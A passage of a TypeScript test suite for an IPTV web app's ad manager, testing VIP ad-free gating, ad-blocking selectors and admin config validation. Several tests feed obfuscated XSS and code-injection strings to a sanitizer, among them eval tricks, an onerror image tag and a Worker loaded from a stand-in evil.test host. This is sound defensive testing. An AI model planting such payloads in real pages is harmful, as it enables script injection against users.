          monetag: { showRegularAds: true, interstitialZoneId: '11242067', caps: { interstitialCooldownMs: 180000, interstitialMaxPerDay: 5 } },
        },
      }),
    }),
  };
  mgrSb.window = mgrSb;
  vm.runInNewContext(adManagerSource, mgrSb, { filename: 'ad-manager.js' });
  await new Promise((r) => setTimeout(r, 25));
  assert.equal(injectedScripts.length, 0);

  // Transitioning to VIP triggers teardownAllAdsUi() which cleans #mrs-monetag-interstitial
  currentGateState = 'vip';
  mgrSb.MRS_AD_STATE = 'vip';
  listenerStateChange?.({ detail: { state: 'vip' } });
  assert.ok(removedIds.includes('mrs-monetag-interstitial'));
});

test('22. ad-manager.js inline snippet regex sanitizer blocks obfuscated/BOM vectors & teardown purges interstitial/popunder nodes', async () => {
  const unsafeSnippets = [
    'location = "https://evil.test"',
    'String.fromCharCode(97,108,101,114,116)',
    'document.createElement("script")',
    'top["eval"]("alert(1)")',
    '\\141lert(1)',
    'new Worker("https://evil.test/w.js")',
    'with(document){cookie}',
  ];

  for (const snippet of unsafeSnippets) {
    const injectedScripts: any[] = [];
    const sb: any = {
      console, Date, Math, JSON, Promise, Error, parseInt, URL, Blob,
      setTimeout: () => 1, clearTimeout: () => {}, setInterval: () => 2, clearInterval: () => {},
      CustomEvent: class CustomEvent { type: string; detail: any; constructor(t: string, o?: any) { this.type = t; this.detail = o?.detail; } },
      addEventListener: () => {},
      dispatchEvent: () => true,
      MRS_AD_STATE: 'free',
      MRS_ADS: { state: () => 'free', _trackLoadedScript: () => {} },
      MRS_ADS_CONFIG: {
        apiBaseUrl: '',
        testMode: false,
        monetag: {
          verificationId: 'fa9656182dbc7301dcd9a2326441dcf3',
          showRegularAds: true,
          directZones: [{ id: 'uplcm-11226634', zoneId: '11226634', url: 'https://uplcm.com/4/11226634', label: 'Z1' }],
          interstitial: {
            zoneId: '11242067',
            url: 'https://uplcm.com/4/11242067',
            scriptSrc: null,
            inlineSnippet: snippet,
          },
        },
        caps: { interstitialCooldownMs: 180000, interstitialMaxPerDay: 5 },
      },
      navigator: { language: 'en-US', userAgent: 'Mozilla/5.0' },
      location: { pathname: '/', hash: '' },
      innerWidth: 1280,
      localStorage: { getItem: () => null, setItem: () => {}, removeItem: () => {} },
      sessionStorage: { getItem: () => null, setItem: () => {} },
      document: {
        readyState: 'complete',
        documentElement: { getAttribute: () => null },
        body: { appendChild: (el: any) => injectedScripts.push(el) },
        querySelector: () => null,
        querySelectorAll: () => [],
        getElementById: () => null,
        createElement: (tag: string) => ({
          tagName: tag.toUpperCase(),
          attributes: {} as Record<string, string>,
          style: {},
          setAttribute(k: string, v: string) { this.attributes[k] = String(v); },
        }),
        addEventListener: () => {},
      },
      fetch: async () => ({
        ok: true,
        status: 200,
        json: async () => ({
          ok: true,
          data: {
            formats: { banner: true, sticky: false, popunder: false, interstitial: true, push: false },
            testMode: false,
            monetag: { showRegularAds: true, interstitialZoneId: '11242067', caps: { interstitialCooldownMs: 180000, interstitialMaxPerDay: 5 } },
          },
        }),
      }),
    };
    sb.window = sb;
    vm.runInNewContext(adManagerSource, sb, { filename: 'ad-manager.js' });
    await new Promise((r) => setTimeout(r, 15));
    assert.equal(injectedScripts.length, 0, `Expected unsafe snippet to be blocked: ${snippet}`);
  }

  // Verify teardownAllAdsUi queries interstitial & popunder nodes on VIP transition
  const queriedSelectors: string[] = [];
  const removedNodes: string[] = [];
  let onStateChange: ((e: any) => void) | null = null;
  let state = 'free';
  const purgeSb: any = {
    console, Date, Math, JSON, Promise, Error, parseInt, URL, Blob,
    setTimeout: () => 1, clearTimeout: () => {}, setInterval: () => 2, clearInterval: () => {},
    CustomEvent: class CustomEvent { type: string; detail: any; constructor(t: string, o?: any) { this.type = t; this.detail = o?.detail; } },
    addEventListener: (ev: string, fn: any) => { if (ev === 'mrs_ads_state_change') onStateChange = fn; },
    dispatchEvent: () => true,
    MRS_AD_STATE: 'free',
    MRS_ADS: { state: () => state, _trackLoadedScript: () => {} },
    MRS_ADS_CONFIG: { apiBaseUrl: '', testMode: true, monetag: { verificationId: 'fa9656182dbc7301dcd9a2326441dcf3', showRegularAds: false } },
    navigator: { language: 'en-US', userAgent: 'Mozilla/5.0' },
    location: { pathname: '/', hash: '' },
    innerWidth: 1280,
    localStorage: { getItem: () => null, setItem: () => {}, removeItem: () => {} },
    sessionStorage: { getItem: () => null, setItem: () => {} },
    document: {
      readyState: 'complete',
      documentElement: { getAttribute: () => null },
      body: { appendChild: () => {} },
      querySelector: () => null,
      querySelectorAll: (sel: string) => {
        queriedSelectors.push(sel);
        return [
          { parentNode: { removeChild: () => removedNodes.push('interstitial-div') } },
          { parentNode: { removeChild: () => removedNodes.push('popunder-iframe') } },
        ];
      },
      getElementById: () => null,
      createElement: (tag: string) => ({ tagName: tag.toUpperCase(), attributes: {}, style: {}, setAttribute: () => {} }),
      addEventListener: () => {},
    },
    fetch: async () => ({ ok: true, status: 200, json: async () => ({ ok: true, data: {} }) }),
  };
  purgeSb.window = purgeSb;
  vm.runInNewContext(adManagerSource, purgeSb, { filename: 'ad-manager.js' });
  state = 'vip';
  onStateChange?.({ detail: { state: 'vip' } });
  const combinedSel = queriedSelectors.join(',');
  assert.ok(combinedSel.includes('div[id*="interstitial"]'));
  assert.ok(combinedSel.includes('div[id*="popunder"]'));
  assert.ok(combinedSel.includes('iframe[id*="interstitial"]'));
  assert.ok(combinedSel.includes('iframe[id*="popunder"]'));
  assert.ok(removedNodes.includes('interstitial-div'));
  assert.ok(removedNodes.includes('popunder-iframe'));
});

test('23. ad-gate.js injects interstitial & popunder blocker CSS selectors, purges ad DOM, and blocks dynamic div/iframe appends when VIP', async () => {
  const capturedStyles: string[] = [];
  const purgeQueries: string[] = [];
  const domAttrs = new Map<string, string>();
  const appended: any[] = [];
  const storageMap = new Map<string, string>([
    ['mrs_vip_entitlement', JSON.stringify({ token: 'vip-blocker-tok' })],
  ]);
  const futureExp = new Date(Date.now() + 86400_000).toISOString();

  const doc: any = {
    cookie: '',
    head: {
      appendChild: (el: any) => {
        if (el?.childrenText) capturedStyles.push(el.childrenText);
        return el;
      },
    },
    documentElement: {
      setAttribute: (k: string, v: string) => domAttrs.set(k, String(v)),
      getAttribute: (k: string) => domAttrs.get(k) || null,
      appendChild: (el: any) => el,
    },
    getElementById: () => null,
    createElement: (tag: string) => ({
      tagName: tag.toUpperCase(),
      childrenText: '',
      attributes: {} as Record<string, string>,
      setAttribute(k: string, v: string) { this.attributes[k] = String(v); },
      getAttribute(k: string) { return this.attributes[k] || null; },
      appendChild(node: any) { if (node?.textContent) this.childrenText += node.textContent; },
    }),
    createTextNode: (t: string) => ({ textContent: t }),
    querySelectorAll: (sel: string) => {
      purgeQueries.push(sel);
      return [];
    },
  };

  function MockElement() {}
  MockElement.prototype.appendChild = (child: any) => {
    appended.push(child);
    return child;
  };

  const sb: any = {
    console, Date, Math, JSON, Promise, AbortController, encodeURIComponent,
    setTimeout: () => 1, clearTimeout: () => {}, setInterval: () => 2, clearInterval: () => {},
    CustomEvent: class CustomEvent { type: string; detail: any; constructor(t: string, o?: any) { this.type = t; this.detail = o?.detail; } },
    Element: MockElement,
    document: doc,
    navigator: { serviceWorker: { getRegistrations: async () => [] } },
    localStorage: {
      get length() { return storageMap.size; },
      key: (i: number) => Array.from(storageMap.keys())[i] ?? null,
      getItem: (k: string) => (storageMap.has(k) ? storageMap.get(k)! : null),
      setItem: (k: string, v: string) => { storageMap.set(String(k), String(v)); },
      removeItem: (k: string) => { storageMap.delete(String(k)); },
    },
    fetch: async () => ({ ok: true, status: 200, json: async () => ({ ok: true, data: { active: true, expiresAt: futureExp } }) }),
    open: () => ({ opened: true }),
    addEventListener: () => {},
    dispatchEvent: () => true,
  };
  sb.window = sb;
  vm.runInNewContext(adGateSource, sb, { filename: 'ad-gate.js' });
  await sb.MRS_ADS.refresh();

  const styleCss = capturedStyles.join('\n');
  assert.ok(styleCss.includes('#mrs-monetag-interstitial'));
  assert.ok(styleCss.includes('#mrs-popunder-script'));
  assert.ok(styleCss.includes('div[id*="interstitial"]'));
  assert.ok(styleCss.includes('div[class*="interstitial"]'));
  assert.ok(styleCss.includes('div[id*="popunder"]'));
  assert.ok(styleCss.includes('div[class*="popunder"]'));
  assert.ok(styleCss.includes('iframe[id*="interstitial"]'));
  assert.ok(styleCss.includes('iframe[id*="popunder"]'));

  const purgeSel = purgeQueries.join(',');
  assert.ok(purgeSel.includes('div[id*="interstitial"]'));
  assert.ok(purgeSel.includes('div[id*="popunder"]'));
  assert.ok(purgeSel.includes('iframe[id*="interstitial"]'));
  assert.ok(purgeSel.includes('iframe[id*="popunder"]'));
  assert.ok(purgeSel.includes('script[src*="al5sm.com"]'));

  // Dynamic appendChild must block Monetag interstitial & popunder overlays while VIP is active, while allowing normal app divs
  const badOverlay = { tagName: 'DIV', id: 'monetag-interstitial-overlay', className: 'popunder-wrap', getAttribute: () => null };
  const normalDiv = { tagName: 'DIV', id: 'channel-grid', className: 'grid', getAttribute: () => null };
  sb.Element.prototype.appendChild.call(doc.head, badOverlay);
  sb.Element.prototype.appendChild.call(doc.head, normalDiv);
  assert.equal(appended.includes(badOverlay), false);
  assert.equal(appended.includes(normalDiv), true);
});

test('24. rewardAds.js enforces comprehensive VIP state checks across availability, status refresh, and watch execution', async () => {
  const futureExp = new Date(Date.now() + 3600_000).toISOString();
  const buildVipCheckSandbox = (opts: {
    cookie?: string;
    domState?: string;
    isVipFlag?: boolean;
    entitlement?: string;
    adFree?: string;
  }) => {
    let networkCalls = 0;
    const storageMap = new Map<string, string>();
    if (opts.entitlement) storageMap.set('mrs_vip_entitlement', opts.entitlement);
    if (opts.adFree) storageMap.set('shahintv_adfree_activation', opts.adFree);

    const sb: any = {
      console, Date, Math, JSON, Promise, Error, parseInt, Uint8Array,
      crypto: webcrypto,
      setTimeout: () => 1, clearTimeout: () => {}, setInterval: () => 2, clearInterval: () => {},
      CustomEvent: class CustomEvent { type: string; detail: any; constructor(t: string, o?: any) { this.type = t; this.detail = o?.detail; } },
      addEventListener: () => {}, dispatchEvent: () => true,
      MRS_AD_STATE: 'free',
      __MRS_IS_VIP: Boolean(opts.isVipFlag),
      MRS_ADS_CONFIG: { apiBaseUrl: '', testMode: true, monetag: { rewarded: { enabled: true } } },
      __MRS_ADS_SERVER_CONFIG: { testMode: true, monetag: { rewardedEnabled: true }, rewards: { cooldownMinutes: 180, anyRewardedAvailable: true } },
      MRS_ADS: { state: () => 'free', enterVipMode: () => {}, refresh: async () => 'free' },
      localStorage: {
        getItem: (k: string) => (storageMap.has(k) ? storageMap.get(k)! : null),
        setItem: (k: string, v: string) => { storageMap.set(k, String(v)); },
        removeItem: (k: string) => { storageMap.delete(k); },
      },
      document: {
        readyState: 'complete',
        cookie: opts.cookie || '',
        documentElement: { getAttribute: (k: string) => (k === 'data-mrs-ad-state' ? (opts.domState ?? 'free') : null) },
        body: { appendChild: () => {} },
        createElement: () => ({ style: {}, setAttribute: () => {}, innerHTML: '' }),
        getElementById: () => null,
        addEventListener: () => {},
      },
      fetch: async () => {
        networkCalls += 1;
        return { ok: true, status: 200, json: async () => ({ ok: true, data: {} }) };
      },
    };
    sb.window = sb;
    vm.runInNewContext(rewardAdsSource, sb, { filename: 'rewardAds.js' });
    return { sb, getNetworkCalls: () => networkCalls };
  };

  const scenarios = [
    { name: 'cookie mrs_vip_active=1', opts: { cookie: 'mrs_vip_active=1' } },
    { name: 'dom attribute vip', opts: { domState: 'vip' } },
    { name: 'global __MRS_IS_VIP flag', opts: { isVipFlag: true } },
    { name: 'active entitlement token', opts: { entitlement: JSON.stringify({ token: 'vip-tok', expiresAt: futureExp }) } },
    { name: 'active adfree activation', opts: { adFree: JSON.stringify({ isActive: true, isAdFree: true, expiryDate: futureExp }) } },
  ];

  for (const s of scenarios) {
    const { sb, getNetworkCalls } = buildVipCheckSandbox(s.opts);
    const avail = sb.MRS_REWARD_ADS.isAvailable();
    assert.equal(avail.available, false, `Expected unavailable for ${s.name}`);
    assert.equal(avail.reason, 'vip_active', `Expected vip_active for ${s.name}`);
    const statusRes = await sb.MRS_REWARD_ADS.refreshStatus();
    assert.equal(statusRes.reason, 'vip_active');
    await assert.rejects(sb.MRS_REWARD_ADS.startAndWatch('monetag'), /VIP is already active/i);
    assert.equal(getNetworkCalls(), 0, `Expected 0 network calls when VIP (${s.name})`);
  }
});

test('25. Environment config NaN/ID validation and admin API strict boolean/object payload validation', async () => {
  // Invalid boolean/object fields in PUT /api/admin/ads/config must return 400 invalid_ad_config
  const invalidPayloads = [
    { testMode: 'yes' },
    { formats: { banner: 'true' } },
    { formats: 'invalid' },
    { monetag: { showRegularAds: 1 } },
    { monetag: { rewarded: { enabled: 'on' } } },
  ];

  for (const payload of invalidPayloads) {
    const res = await fetch(`${baseUrl}/api/admin/ads/config`, {
      method: 'PUT',
      headers: { 'Content-Type': 'application/json', 'x-admin-token': 'test-admin-secret-123' },
      body: JSON.stringify(payload),
    });
    assert.equal(res.status, 400, `Expected 400 for payload ${JSON.stringify(payload)}`);
    const json = await res.json() as any;
    assert.equal(json.error.code, 'invalid_ad_config');
  }

  // Test NaN/invalid env fallback in config.js via isolated ESM query import
  const prevEnv = {
    REWARD_MIN_WATCH_MS: process.env.REWARD_MIN_WATCH_MS,
    MONETAG_POPUNDER_MAX_PER_DAY: process.env.MONETAG_POPUNDER_MAX_PER_DAY,
    MONETAG_VERIFICATION_ID: process.env.MONETAG_VERIFICATION_ID,
    MONETAG_INTERSTITIAL_ZONE_ID: process.env.MONETAG_INTERSTITIAL_ZONE_ID,
    MONETAG_REWARDED_SHOW_FN: process.env.MONETAG_REWARDED_SHOW_FN,
  };
  try {
    process.env.REWARD_MIN_WATCH_MS = 'not-a-number';
    process.env.MONETAG_POPUNDER_MAX_PER_DAY = '9999';
    process.env.MONETAG_VERIFICATION_ID = 'bad!id';
    process.env.MONETAG_INTERSTITIAL_ZONE_ID = 'bad zone!';
    process.env.MONETAG_REWARDED_SHOW_FN = 'eval("bad")';

    const isolatedMod = await import(`../server/mrs-iptv-backend/src/config.js?t=${Date.now()}`);
    assert.equal(isolatedMod.config.rewards.minWatchMs, 15000);
    assert.equal(isolatedMod.config.rewards.monetagPopunderMaxPerDay, 20);
    assert.equal(isolatedMod.config.rewards.monetagVerificationId, MONETAG_DEFAULT_VERIFICATION_ID);
    assert.equal(isolatedMod.config.rewards.monetagInterstitialZoneId, MONETAG_DEFAULT_INTERSTITIAL_ZONE_ID);
    assert.equal(isolatedMod.config.rewards.monetagRewardedShowFn, '');
  } finally {
    for (const [k, v] of Object.entries(prevEnv)) {
      if (v === undefined) delete process.env[k];
      else process.env[k] = v;
    }
  }
});

test('26. Expanded CSS/DOM blockers cover third-party ad domains, data-zone attrs, vignettes, and MRS_ADS.isVip()', async () => {
  const capturedStyles: string[] = [];
  const purgeQueries: string[] = [];
  const appended: any[] = [];
  const domAttrs = new Map<string, string>();
  const storageMap = new Map<string, string>([
    ['mrs_vip_entitlement', JSON.stringify({ token: 'vip-tok-26' })],
  ]);
  const futureExp = new Date(Date.now() + 86400_000).toISOString();

  const doc: any = {
    cookie: '',
    head: {
      appendChild: (el: any) => {
        if (el?.childrenText) capturedStyles.push(el.childrenText);
        return el;
      },
    },
    documentElement: {
      setAttribute: (k: string, v: string) => domAttrs.set(k, String(v)),
      getAttribute: (k: string) => domAttrs.get(k) || null,
      appendChild: (el: any) => el,
    },
    getElementById: () => null,
    createElement: (tag: string) => ({
      tagName: tag.toUpperCase(),
      childrenText: '',
      attributes: {} as Record<string, string>,
      setAttribute(k: string, v: string) { this.attributes[k] = String(v); },
      getAttribute(k: string) { return this.attributes[k] || null; },
      appendChild(node: any) { if (node?.textContent) this.childrenText += node.textContent; },
    }),
    createTextNode: (t: string) => ({ textContent: t }),
    querySelectorAll: (sel: string) => {
      purgeQueries.push(sel);
      return [];
    },
  };

  function MockElement() {}
  MockElement.prototype.appendChild = (child: any) => {
    appended.push(child);
    return child;
  };

  const sb: any = {
    console, Date, Math, JSON, Promise, AbortController, encodeURIComponent,
    setTimeout: () => 1, clearTimeout: () => {}, setInterval: () => 2, clearInterval: () => {},
    CustomEvent: class CustomEvent { type: string; detail: any; constructor(t: string, o?: any) { this.type = t; this.detail = o?.detail; } },
    Element: MockElement,
    document: doc,
    navigator: { serviceWorker: { getRegistrations: async () => [] } },
    localStorage: {
      get length() { return storageMap.size; },
      key: (i: number) => Array.from(storageMap.keys())[i] ?? null,
      getItem: (k: string) => (storageMap.has(k) ? storageMap.get(k)! : null),
      setItem: (k: string, v: string) => { storageMap.set(String(k), String(v)); },
      removeItem: (k: string) => { storageMap.delete(String(k)); },
    },
    fetch: async () => ({ ok: true, status: 200, json: async () => ({ ok: true, data: { active: true, expiresAt: futureExp } }) }),
    open: () => ({ opened: true }),
    addEventListener: () => {},
    dispatchEvent: () => true,
  };
  sb.window = sb;
  vm.runInNewContext(adGateSource, sb, { filename: 'ad-gate.js' });
  await sb.MRS_ADS.refresh();

  assert.equal(sb.MRS_ADS.isVip(), true);

  const styleCss = capturedStyles.join('\n');
  for (const sel of [
    '[data-zone]',
    '[data-ad-zone]',
    '[data-monetag-zone]',
    'ins[data-zone]',
    'div[class*="vignette"]',
    'aside[id*="monetag"]',
    'section[id*="monetag"]',
    'iframe[src*="acscdn.com"]',
    'iframe[src*="al5sm.com"]',
    '#mrs-consent-banner',
    '#mrs-push-preprompt',
    '#mrs-reward-sim-modal',
  ]) {
    assert.ok(styleCss.includes(sel), `Expected ad-gate style to contain ${sel}`);
  }

  const indexCss = fs.readFileSync(path.join(process.cwd(), 'src', 'index.css'), 'utf8');
  for (const sel of ['[data-zone]', 'div[class*="vignette"]', 'iframe[src*="acscdn.com"]', 'iframe[src*="uplcm.com"]']) {
    assert.ok(indexCss.includes(sel), `Expected index.css to contain ${sel}`);
  }

  // Dynamic appendChild blocks ins[data-zone] and aside.vignette-box while VIP
  const zoneIns = { tagName: 'INS', id: '', className: '', getAttribute: (k: string) => (k === 'data-zone' ? '11242067' : null) };
  const vignetteAside = { tagName: 'ASIDE', id: '', className: 'vignette-banner', getAttribute: () => null };
  sb.Element.prototype.appendChild.call(doc.head, zoneIns);
  sb.Element.prototype.appendChild.call(doc.head, vignetteAside);
  assert.equal(appended.includes(zoneIns), false);
  assert.equal(appended.includes(vignetteAside), false);
});

test('27. Stricter server-side payload validation rejects arrays, empty objects, unknown fields, and invalid cap types', async () => {
  const rejectedPayloads: unknown[] = [
    {},
    [],
    { unknownRootField: true },
    { hideOffersForVip: true },
    { adsterra: { enabled: true } },
    { formats: { affiliate: true } },
    { monetag: { unknownKey: '123' } },
    { monetag: { interstitial: { zoneId: '11242067', extra: 'bad' } } },
    { monetag: { caps: { unknownCap: 10 } } },
    { monetag: { caps: { popunderMaxPerDay: true } } },
    { monetag: { caps: { popunderMaxPerDay: 2.5 } } },
    { monetag: { rewarded: { enabled: false, evilProp: 'x' } } },
  ];

  for (const payload of rejectedPayloads) {
    const res = await fetch(`${baseUrl}/api/admin/ads/config`, {
      method: 'PUT',
      headers: { 'Content-Type': 'application/json', 'x-admin-token': 'test-admin-secret-123' },
      body: JSON.stringify(payload),
    });
    assert.equal(res.status, 400, `Expected 400 for payload: ${JSON.stringify(payload)}`);
    const json = await res.json() as any;
    assert.ok(['invalid_ad_config', 'invalid_ad_cap'].includes(json.error.code));
  }

  const badToggle = await fetch(`${baseUrl}/api/admin/rewards/toggle`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'x-admin-token': 'test-admin-secret-123' },
    body: JSON.stringify({ network: 'monetag', extra: 'blocked' }),
  });
  assert.equal(badToggle.status, 400);
  assert.equal(((await badToggle.json()) as any).error.code, 'invalid_ad_config');
});

test('28. Script execution XSS hardening blocks obfuscated expressions & ad-manager sticky banner avoids innerHTML', async () => {
  const { isSafeInlineAdSnippet } = await import('../src/lib/monetagConfig.js');
  const xssPayloads = [
    '${alert(1)}',
    '("")["sub"]["constructor"]("alert(1)")()',
    'Reflect.get(globalThis, "eval")("1")',
    'new DOMParser().parseFromString("<svg>", "text/html")',
    'document.defaultView.alert(1)',
    '<script>console.log("<script>")</script>',
    '<script src="https://uplcm.com/4/11226634" data-zone="112`266`34"></script>',
  ];
  for (const p of xssPayloads) {
    assert.throws(() => sanitizeRewardedSnippet(p), /Rewarded snippet/i, `Should reject XSS snippet: ${p}`);
  }
  assert.equal(isSafeInlineAdSnippet('${alert(1)}'), false);
  assert.equal(isSafeInlineAdSnippet('window.MonetagBannerInit()'), false);
  assert.equal(isSafeInlineAdSnippet('MonetagSDK.init({ zoneId: 11226634 })'), true);

  // ad-manager.js sticky mobile banner builds safe DOM nodes via textContent (zero innerHTML) and allows only allowlisted attrs in scripts
  const appendedToBody: any[] = [];
  const makeNode = (tag: string): any => {
    const node: any = {
      tagName: tag.toUpperCase(),
      id: '',
      className: '',
      style: {},
      textContent: '',
      children: [] as any[],
      attributes: {} as Record<string, string>,
      parentNode: { removeChild: () => {} },
      setAttribute(k: string, v: string) { this.attributes[k] = String(v); },
      getAttribute(k: string) { return this.attributes[k] || null; },
      appendChild(child: any) { this.children.push(child); return child; },
      addEventListener: () => {},
      querySelector: () => null,
    };
    Object.defineProperty(node, 'innerHTML', {
      get: () => '',
      set: (val: string) => {
        if (val.includes('onerror') || val.includes('mrs-sticky-close-btn')) {
          throw new Error('renderStickyMobileBanner must not write innerHTML');
        }
      },
    });
    return node;
  };

  const sb: any = {
    console, Date, Math, JSON, Promise, Error, parseInt, URL, Blob,
    setTimeout: () => 1, clearTimeout: () => {}, setInterval: () => 2, clearInterval: () => {},
    CustomEvent: class CustomEvent { type: string; detail: any; constructor(t: string, o?: any) { this.type = t; this.detail = o?.detail; } },
    addEventListener: () => {},
    dispatchEvent: () => true,
    MRS_AD_STATE: 'free',
    MRS_ADS: { state: () => 'free', _trackLoadedScript: () => {} },
    MRS_ADS_CONFIG: {
      apiBaseUrl: '',
      testMode: false,
      monetag: {
        showRegularAds: true,
        directZones: [{ id: 'z1', zoneId: '11226634', url: 'https://uplcm.com/4/11226634', label: '<img src=x onerror=alert(1)>' }],
      },
    },
    navigator: { language: 'en-US', userAgent: 'Mozilla/5.0' },
    location: { pathname: '/', hash: '' },
    innerWidth: 390,
    localStorage: { getItem: () => null, setItem: () => {}, removeItem: () => {} },
    sessionStorage: { getItem: () => null, setItem: () => {} },
    document: {
      readyState: 'complete',
      documentElement: { getAttribute: () => null },
      body: { appendChild: (el: any) => appendedToBody.push(el) },
      querySelector: () => null,
      querySelectorAll: () => [],
      getElementById: () => null,
      createElement: (tag: string) => makeNode(tag),
      addEventListener: () => {},
    },
    fetch: async () => ({
      ok: true,
      status: 200,
      json: async () => ({
        ok: true,
        data: {
          formats: { banner: true, sticky: true, popunder: false, interstitial: false, push: false },
          testMode: false,
          monetag: {
            showRegularAds: true,
            zones: [{ id: 'z1', zoneId: '11226634', url: 'https://uplcm.com/4/11226634', label: '<img src=x onerror=alert(1)>' }],
          },
        },
      }),
    }),
  };
  sb.window = sb;
  vm.runInNewContext(adManagerSource, sb, { filename: 'ad-manager.js' });
  await new Promise((r) => setTimeout(r, 25));

  const stickyWrap = appendedToBody.find((el) => el.id === 'mrs-sticky-mobile-ad');
  assert.ok(stickyWrap, 'Sticky banner should mount using safe DOM APIs');
  const anchorNode = stickyWrap.children[0];
  assert.equal(anchorNode.tagName, 'A');
  assert.equal(anchorNode.getAttribute('href'), 'https://uplcm.com/4/11226634');
  assert.equal(anchorNode.children[1].textContent, '<img src=x onerror=alert(1)>');
});

test('29. detectClientVipState() & isClientVipActive() unify VIP detection across gate, DOM, cookie, entitlement, and legacy rejection', async () => {
  const { detectClientVipState, isClientVipActive } = await import('../src/lib/mrsVip.js');
  const origWindow = (globalThis as any).window;
  const origDocument = (globalThis as any).document;
  const origLocalStorage = (globalThis as any).localStorage;

  const mockStore = new Map<string, string>();
  const futureExp = new Date(Date.now() + 3600_000).toISOString();
  const pastExp = new Date(Date.now() - 3600_000).toISOString();
  let domAttrState: string | null = 'free';
  let cookieStr = '';

  const setupGlobals = (winOverrides: Record<string, any> = {}) => {
    (globalThis as any).localStorage = {
      getItem: (k: string) => (mockStore.has(k) ? mockStore.get(k)! : null),
      setItem: (k: string, v: string) => { mockStore.set(k, String(v)); },
      removeItem: (k: string) => { mockStore.delete(k); },
    };
    (globalThis as any).document = {
      get cookie() { return cookieStr; },
      documentElement: {
        getAttribute: (k: string) => (k === 'data-mrs-ad-state' ? domAttrState : null),
      },
    };
    (globalThis as any).window = {
      MRS_AD_STATE: 'free',
      MRS_ADS: { state: () => (globalThis as any).window.MRS_AD_STATE, isVip: () => false },
      ...winOverrides,
    };
  };

  try {
    // 1. Clean free user
    mockStore.clear();
    cookieStr = '';
    domAttrState = 'free';
    setupGlobals();
    assert.deepEqual(detectClientVipState().state, 'free');
    assert.equal(isClientVipActive(), false);

    // 2. MRS_ADS.isVip() => true
    setupGlobals({ MRS_ADS: { state: () => 'free', isVip: () => true } });
    assert.equal(isClientVipActive(), true);
    assert.equal(detectClientVipState().source, 'gate');

    // 3. Pending gate state => locked, not VIP
    setupGlobals({ MRS_AD_STATE: 'pending', MRS_ADS: { state: () => 'pending', isVip: () => false } });
    const pendingRes = detectClientVipState();
    assert.equal(pendingRes.state, 'pending');
    assert.equal(pendingRes.isLocked, true);
    assert.equal(pendingRes.isVip, false);

    // 4. Cookie fallback
    cookieStr = 'mrs_vip_active=1';
    setupGlobals();
    assert.equal(isClientVipActive(), true);
    assert.equal(detectClientVipState().source, 'cookie');
    cookieStr = '';

    // 5. Legacy SPONSOR_REWARD_VIP ignored (stays free)
    mockStore.set('shahintv_adfree_activation', JSON.stringify({ isActive: true, isAdFree: true, code: 'SPONSOR_REWARD_VIP', expiryDate: futureExp }));
    setupGlobals();
    assert.equal(isClientVipActive(), false);

    // 6. Valid ad-free pass detected
    mockStore.set('shahintv_adfree_activation', JSON.stringify({ isActive: true, isAdFree: true, code: 'MRS-1M-TEST', expiryDate: futureExp }));
    assert.equal(isClientVipActive(), true);
    assert.equal(detectClientVipState().source, 'adfree');

    // 7. Expired token + expired hint ignored
    mockStore.clear();
    mockStore.set('mrs_vip_entitlement', JSON.stringify({ token: 'old-tok', expiresAt: pastExp }));
    mockStore.set('mrs_vip_ads_hint', JSON.stringify({ expiresAt: pastExp }));
    assert.equal(isClientVipActive(), false);
  } finally {
    (globalThis as any).window = origWindow;
    (globalThis as any).document = origDocument;
    (globalThis as any).localStorage = origLocalStorage;
  }
});

test('30. ad-gate.js blocks expanded third-party ad domains, insertBefore injections, and non-HTTPS approved scripts', async () => {
  const capturedStyles: string[] = [];
  const purgeQueries: string[] = [];
  const domAttrs = new Map<string, string>();
  const inserted: any[] = [];
  const storageMap = new Map<string, string>([
    ['mrs_vip_entitlement', JSON.stringify({ token: 'vip-tok-30' })],
  ]);
  const futureExp = new Date(Date.now() + 86400_000).toISOString();

  const doc: any = {
    cookie: '',
    head: {
      appendChild: (el: any) => {
        if (el?.childrenText) capturedStyles.push(el.childrenText);
        return el;
      },
    },
    documentElement: {
      setAttribute: (k: string, v: string) => domAttrs.set(k, String(v)),
      getAttribute: (k: string) => domAttrs.get(k) || null,
      appendChild: (el: any) => el,
    },
    getElementById: () => null,
    createElement: (tag: string) => ({
      tagName: tag.toUpperCase(),
      childrenText: '',
      attributes: {} as Record<string, string>,
      setAttribute(k: string, v: string) { this.attributes[k] = String(v); },
      getAttribute(k: string) { return this.attributes[k] || null; },
      appendChild(node: any) { if (node?.textContent) this.childrenText += node.textContent; },
    }),
    createTextNode: (t: string) => ({ textContent: t }),
    querySelectorAll: (sel: string) => {
      purgeQueries.push(sel);
      return [];
    },
  };

  function MockElement() {}
  MockElement.prototype.appendChild = (child: any) => child;
  MockElement.prototype.insertBefore = (child: any) => {
    inserted.push(child);
    return child;
  };

  const sb: any = {
    console, Date, Math, JSON, Promise, AbortController, encodeURIComponent, URL,
    setTimeout: () => 1, clearTimeout: () => {}, setInterval: () => 2, clearInterval: () => {},
    CustomEvent: class CustomEvent { type: string; detail: any; constructor(t: string, o?: any) { this.type = t; this.detail = o?.detail; } },
    Element: MockElement,
    document: doc,
    navigator: { serviceWorker: { getRegistrations: async () => [] } },
    localStorage: {
      get length() { return storageMap.size; },
      key: (i: number) => Array.from(storageMap.keys())[i] ?? null,
      getItem: (k: string) => (storageMap.has(k) ? storageMap.get(k)! : null),
      setItem: (k: string, v: string) => { storageMap.set(String(k), String(v)); },
      removeItem: (k: string) => { storageMap.delete(String(k)); },
    },
    fetch: async () => ({ ok: true, status: 200, json: async () => ({ ok: true, data: { active: true, expiresAt: futureExp } }) }),
    open: () => ({ opened: true }),
    addEventListener: () => {},
    dispatchEvent: () => true,
  };
  sb.window = sb;
  vm.runInNewContext(adGateSource, sb, { filename: 'ad-gate.js' });
  await sb.MRS_ADS.refresh();

  const styleCss = capturedStyles.join('\n');
  for (const sel of [
    '[data-monetag]',
    '[data-interstitial]',
    '[data-popunder]',
    'dialog[id*="monetag"]',
    'iframe[src*="otieu.com"]',
    'iframe[src*="nap5k.com"]',
    'iframe[src*="gloaphoo.net"]',
    'iframe[src*="dolohen.com"]',
  ]) {
    assert.ok(styleCss.includes(sel), `Expected ad-gate style to contain ${sel}`);
  }

  // insertBefore blocks new domain scripts, data-monetag containers, and non-https/inline-handler scripts
  const otieuScript = { tagName: 'SCRIPT', src: 'https://otieu.com/4/tag.js', getAttribute: () => null };
  const monetagDialog = { tagName: 'DIALOG', id: 'monetag-promo', className: '', getAttribute: (k: string) => (k === 'data-monetag' ? '1' : null) };
  const insecureApproved = {
    tagName: 'SCRIPT',
    src: 'http://uplcm.com/4/11226634',
